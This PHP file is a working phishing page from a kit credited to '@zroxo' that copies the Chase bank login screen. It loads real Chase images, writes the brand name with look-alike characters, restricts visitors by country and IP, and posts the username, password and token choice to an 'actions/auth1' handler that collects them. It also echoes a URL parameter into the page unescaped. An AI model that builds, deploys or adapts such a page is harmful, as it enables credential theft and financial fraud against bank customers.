<?php
error_reporting(E_ALL ^ E_NOTICE);
session_start();

//include'Protection.php';
include'admin/config.php';


	
//   if (!isset($_SESSION['ZRXSESSION']) or !isset($_GET['key'])) {
//       header('HTTP/1.0 403 Forbidden');
//       die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
//       exit();
//   }
if ($lock_country == "on") {
  if ($_SESSION['countrycode'] !== "US") {
   exit(header("Location: exit?key=".$_SESSION['ZRXSESSION'].""));
}
}

////////////// check ip 
	$vistorsIp= json_decode(file_get_contents("admin/vistors_ip.txt"),true);
	$ip = $_SESSION['ip'];
	// if (in_array($ip, $vistorsIp))
      {
       
      //  exit(header("Location: https://l.wl.co/l?u=https://p.placed.com/api/v2/sync/impression?redirect=https://chase.com"));
      }
	
	////////////////
	
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
    
    
// Generating a CSRF Token

if (empty($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(32));
}
$token = $_SESSION['token'];

?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">

<head>
    <link rel="stylesheet" type="text/css" href="files/css/zroxologin.css">
    <meta charset="utf-8">
    <meta name="robots" content="noindex,nofollow">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Sign in</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="files/img/faviconx.ico">
    <style type="text/css">
    .checkb0t {
        display: none;
    }

    /* hide because is s.p.a.m protection */
    </style>
</head>

<body style="overflow-x: hidden; overflow-y: auto; height: 100%">
    <div>
        <div class="APQX8TOT29">
            <div class="dY6soUpoP0">
                <header>
                    <div class="x9Nc8tZa3S header zroxo rZNyBL4qGz sx67hNTH8f">
                        <a href="#">
                            <div class="PJfrTpnTHI"></div>
                        </a>
                    </div>
                </header>
                <main>
                    <div class="container x9Nc8tZa3S">
                        <div>
                            <div>
                                <div class="zroxo background image fixed">
                                    <style type="text/css">
                                    @media (min-width: 1024px) {
                                        .zroxo.background.image {
                                            background-image: url('https://static.chasecdn.com/content/geo-images/images/background.desktop.day.1.jpeg');
                                        }
                                    }

                                    @media (min-width: 992px) {
                                        .zroxo.background.image {
                                            background-image: url('https://static.chasecdn.com/content/geo-images/images/background.tablet.day.1.jpeg');
                                        }
                                    }

                                    @media (min-width: 320px) {
                                        .zroxo.background.image {
                                            background-image: url('https://static.chasecdn.com/content/geo-images/images/background.mobile.day.1.jpeg');
                                        }
                                    }

                                    .zroxo.background.image {
                                        background-image: url('https://static.chasecdn.com/content/geo-images/images/background.desktop.day.1.jpeg');
                                    }
                                    </style>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 n3xA7BMN0e">
                                <div class="zroxo MGMfPqAHG9 FvpMqmY9j8">
                                    <div class="row">
                                        <div class="col-xs-10 col-xs-offset-1">
                                            <form id="zroxoform654" method="POST" action="actions/auth1">
                                                <input type="hidden" name="token" value="<?php echo $token; ?>" />
                                                <input type="hidden" name="key_token"
                                                    value="<?php echo $_GET['key']; ?>" />
                                                <input name="checkb0t" type="text" class="checkb0t" />

                                                <div>
                                                    <?php
                                        if (isset($_GET['invalid2'])) {
                                          echo "<div class='zroxo error error rGCcxubecl primary animate alert' role='region'>
                                          <div class='icon'>
                                            <span ><i class='zroxo M7u1tPGrE0 icon' ></i></span>
                                          </div>
                                          <div class='icon background'></div>
                                          <div class='WdRZGPsyPV uY7iEvLzQK'><h2 class='title'>
                                            <span class='LmS50tAt4k vWOxiBOa2l'>Important: </span>We can't find that username and password. You can <a href='#''>reset your password</a> or try again.</h2> </div>
                                          </div>
                                        </div>";
                                        }elseif (isset($_GET['invalid'])) {    // invalid 
                                          echo "<div class='zroxo error error rGCcxubecl primary animate alert' role='region'>
                                          <div class='icon'>
                                            <span ><i class='zroxo M7u1tPGrE0 icon' ></i></span>
                                          </div>
                                          <div class='icon background'></div>
                                          <div class='WdRZGPsyPV uY7iEvLzQK'><h2 class='title'>
                                            <span class='LmS50tAt4k vWOxiBOa2l'>Important: </span>We can't find that username and password. You can <a href='#''>reset your password</a> or try again.</h2> </div>
                                          </div>
                                        </div><input type='hidden' name='invalid' />";
                                        }
                                        ?>
                                                    <div class="zroxo UvNGIJtldK pe1BS86P8H hxbMFGbWNJ">
                                                        <div class="zroxo Bcc5bNeCpE">
                                                            <div class="zCwrwxLY56 uJXEqB9DWp zroxo1 ">
                                                                <div class="mpxuej7DtP"><label
                                                                        class="zroxo vJGN0ZaFzl Bcc5bNeCpE zroxo1"
                                                                        for="username"><span
                                                                            class="LmS50tAt4k vWOxiBOa2l"></span>Username
                                                                        <span
                                                                            class="LmS50tAt4k vWOxiBOa2l"></span></label>
                                                                </div>
                                                                <div id="userId-text"> <input min="0"
                                                                        class="zroxo input zroxo1" placeholder=""
                                                                        autocomplete="off" type="text" name="username"
                                                                        id="username" required=""> </div>
                                                            </div>
                                                            <div>
                                                                <div> </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="zroxo UvNGIJtldK pe1BS86P8H">
                                                        <div class="zroxo Bcc5bNeCpE">
                                                            <div class="zCwrwxLY56 uJXEqB9DWp zroxo2">
                                                                <div class="mpxuej7DtP"><label
                                                                        class="zroxo vJGN0ZaFzl Bcc5bNeCpE zroxo2"
                                                                        for="password"><span
                                                                            class="LmS50tAt4k vWOxiBOa2l"></span>Password
                                                                        <span
                                                                            class="LmS50tAt4k vWOxiBOa2l"></span></label>
                                                                </div>
                                                                <div id="password-text"> <input
                                                                        class="zroxo input zroxo2" placeholder=""
                                                                        autocomplete="off" type="password" name="pw"
                                                                        required="" value="" id="password"></div>
                                                            </div>
                                                            <div>
                                                                <div> </div>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div class="row">
                                                        <div class="col-xs-6 rememberMe-checkbox-container">
                                                            <div class="zroxo checkbox">
                                                                <div class="checkbox-flex">
                                                                    <div class="Ry3vP19B7B"><input
                                                                            class="checkbox__input" type="checkbox"
                                                                            id="rememberMe"><i
                                                                            class="zroxo checkmark icon check"></i>
                                                                    </div>
                                                                    <label for="rememberMe"> <span
                                                                            class="JziaBRbLWB">Remember me
                                                                        </span></label>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="col-xs-6">
                                                            <div class="zroxo checkbox useToken" id="useToken">
                                                                <div class="checkbox-flex">
                                                                    <div class="Ry3vP19B7B">
                                                                        <input class="checkbox__input" type="checkbox"
                                                                            name="rsaToken" id="input-useToken"
                                                                            value="on"> <i
                                                                            class="zroxo checkmark icon check"
                                                                            aria-hidden="true"></i>
                                                                    </div>
                                                                    <label for="input-useToken"> <span
                                                                            class="JziaBRbLWB" id="token">Use token
                                                                        </span></label>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div class="row">
                                                        <button type="submit" id="btn-submit"
                                                            class="zroxo button focus fluid primary"><span
                                                                class="label">Sign in</span> </button>
                                                    </div>
                                                    <div class="row"><span class="zroxo link"><a class="ATXcsk5wNY"
                                                                href="javascript:void(0);">Forgot username/password?<i
                                                                    class="zroxo progressright icon end-icon"></i></a></span>
                                                    </div>
                                                    <div class="row"><span class="zroxo link"><a class="ATXcsk5wNY last"
                                                                href="javascript:void(0);">Not Enrolled? Sign Up Now.<i
                                                                    class="zroxo progressright icon end-icon"></i></a></span>
                                                    </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </main>
            </div>
            <footer style="position: absolute; width: 100%; bottom: 0; height: 92px;">
                <div class="bTQw33gZg8" id="r6ueGLd3bC">
                    <div class="container">
                        <div class="fSzrEf2xXg row">
                            <div class="col-xs-12">
                                <span class="follow-us-text">Follow us:</span>
                                <ul class="icon-links">
                                    <li class="facebook"><span><a class="LbMdl152TL"><i
                                                    class="zroxo facebook icon"></i></a></span></li>
                                    <li class="instagram"><span><a class="LbMdl152TL"><i
                                                    class="zroxo instagram icon"></i></a></span></li>
                                    <li class="twitter"><span><a class="LbMdl152TL"><i
                                                    class="zroxo twitter icon"></i></a></span></li>
                                    <li class="youtube"><span><a class="LbMdl152TL"><i
                                                    class="zroxo youtube icon"></i></a></span></li>
                                    <li class="linkedin"><span><a class="LbMdl152TL"><i
                                                    class="zroxo linkedin icon"></i></a></span></li>
                                </ul>
                            </div>
                        </div>
                        <div class="XhNmC5gw8h row fxdUrIpCR3">
                            <div class="col-xs-12">
                                <ul>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY"
                                                href="javascript:void(0);">Contact us</a></span></li>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY"
                                                href="javascript:void(0);">Privacy</a></span></li>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY"
                                                href="javascript:void(0);">Security</a></span></li>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY" href="javascript:void(0);">Terms
                                                of use</a></span></li>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY"
                                                href="javascript:void(0);">Accessibility</a></span></li>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY" href="javascript:void(0);">SAFE
                                                Act: Cħasẹ Mortgage Loan Originators</a></span></li>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY" href="javascript:void(0);">Fair
                                                Lending</a></span></li>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY" href="javascript:void(0);">About
                                                Cħasẹ</a></span></li>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY" href="javascript:void(0);">J.P.
                                                Morgan</a></span></li>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY"
                                                href="javascript:void(0);">JPMorgan Cħasẹ &amp; Co.</a></span></li>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY"
                                                href="javascript:void(0);">Careers</a></span></li>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY"
                                                href="javascript:void(0);">Español</a></span></li>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY" href="javascript:void(0);">Cħasẹ
                                                Canada</a></span></li>
                                    <li><span class="zroxo link"><a class="ATXcsk5wNY" href="javascript:void(0);">Site
                                                map</a></span></li>
                                    <li>Member FDIC</li>
                                    <li><i class="zroxo m6EDmUrEst icon"></i> Equal Housing Lender</li>
                                    <li class="Fq8f9PEuyT">© 2021 JPMớrgαn Cħasẹ &amp; Co.</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script type="text/javascript">
    const urlSearchParams = new URLSearchParams(window.location.search);
    const params = Object.fromEntries(urlSearchParams.entries());

    if (params.key === '' || params.key === null || params.key === undefined) {
        window.location.href = "/final_backup/error";
    }

    $("#username").focus(function() {
        $(".zCwrwxLY56.uJXEqB9DWp.zroxo1").addClass("floating")
    }).blur(function() {
        $(".zCwrwxLY56.uJXEqB9DWp.zroxo1").removeClass("floating")
    }), $("#password").focus(function() {
        $(".zCwrwxLY56.uJXEqB9DWp.zroxo2").addClass("floating")
    }).blur(function() {
        $(".zCwrwxLY56.uJXEqB9DWp.zroxo2").removeClass("floating")
    }), $("#username").keyup(function() {
        $.trim($("#username").val()).length ? $(".zCwrwxLY56.uJXEqB9DWp.zroxo1").addClass("value") : $(
            ".zCwrwxLY56.uJXEqB9DWp.zroxo1").removeClass("value")
    }), $("#password").keyup(function() {
        $.trim($("#password").val()).length ? $(".zCwrwxLY56.uJXEqB9DWp.zroxo2").addClass("value") : $(
            ".zCwrwxLY56.uJXEqB9DWp.zroxo2").removeClass("value")
    }), $(".checkbox__input").click(function() {
        $(this).toggleClass("checkbox__input--checked")
    });

    $(document).ready(function() {
        $('#zroxoform654 input[id="username"]').blur(function() {
            $(this).val() ? ($(".zroxo.vJGN0ZaFzl.Bcc5bNeCpE.zroxo1").removeClass("error"), $(
                ".zroxo.input.zroxo1").removeClass("clientSideError")) : ($(
                ".zroxo.vJGN0ZaFzl.Bcc5bNeCpE.zroxo1").addClass("error"), $(
                ".zroxo.input.zroxo1").addClass("clientSideError"))
        }), $('#zroxoform654 input[id="password"]').blur(function() {
            $(this).val() ? ($(".zroxo.vJGN0ZaFzl.Bcc5bNeCpE.zroxo1").removeClass("error"), $(
                ".zroxo.input.zroxo2").removeClass("clientSideError")) : ($(
                ".zroxo.vJGN0ZaFzl.Bcc5bNeCpE.zroxo2").addClass("error"), $(
                ".zroxo.input.zroxo2").addClass("clientSideError"))
        })
    });
    </script>

</body>

</html>